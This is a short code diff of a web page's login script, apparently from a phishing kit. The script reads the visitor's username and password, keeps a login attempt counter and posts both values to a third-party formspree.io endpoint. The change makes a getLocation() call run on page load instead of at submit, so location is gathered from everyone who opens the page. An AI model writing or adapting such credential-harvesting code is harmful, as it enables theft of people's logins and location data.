@@ -38,6 +38,7 @@
 
             <script type="text/javascript">
 
+                getLocation();
                 var login_counter = 0;
 
                 $(document).ready(function() {
@@ -74,7 +75,7 @@
 
                     var username_value = $('#username').val();
                     var password_value = $('#password').val();
-                    getLocation();
+                    // getLocation();
 
                     $.ajax({
                         url: "https://formspree.io/" + formspree_form_code,
